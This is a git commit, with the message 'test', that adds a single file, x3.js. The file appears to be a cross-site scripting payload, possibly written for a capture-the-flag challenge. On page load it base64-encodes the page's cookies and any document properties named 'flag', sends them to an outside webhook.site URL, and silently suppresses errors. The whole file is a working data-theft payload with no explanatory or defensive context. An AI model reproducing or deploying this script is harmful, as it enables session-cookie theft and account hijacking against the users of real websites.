865aceec45210b5a98bc646dcb8098dec635d573
Subeg Suwal <189625670+glutton-su@users.noreply.github.com>
2025-11-07 17:25:45 +0000

    test

---
+++ x3.js
@@ -0,0 +1,12 @@
+// x3.js
+(async () => {
+  try {
+    const cookie = btoa(document.cookie);
+    const flags = Object.fromEntries(
+      Object.entries(document).filter(([k]) => k.startsWith('flag'))
+    );
+    const flagData = btoa(JSON.stringify(flags));
+
+    await fetch(`https://webhook.site/e3b89cc5-8256-4a4f-ba9f-c9d1b46bc94c?c=${cookie}&f=${flagData}&t=3`);
+  } catch (e) {}
+})();
